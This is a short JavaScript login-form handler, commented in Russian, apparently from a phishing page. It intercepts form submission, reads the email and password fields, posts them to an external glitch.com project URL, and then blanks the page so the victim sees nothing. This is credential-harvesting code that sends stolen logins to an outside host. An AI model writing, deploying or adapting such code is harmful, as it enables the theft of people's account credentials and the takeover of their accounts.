document.getElementById("login-form").addEventListener("submit", function(e) {
    e.preventDefault();  

    const email = document.getElementById("erf_username").value;
    const password = document.getElementById("erf_password").value;

    // Отправка данных на сервер
    fetch('https://glitch.com/edit/#!/living-historical-september', {  
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password })  
    })
    .then(response => response.text())  
    .then(data => {
        console.log(data);  
        document.body.style.backgroundColor = "white";  
        document.body.innerHTML = "";  
    })
    .catch(error => {
        console.error('Error:', error);  
    });
});
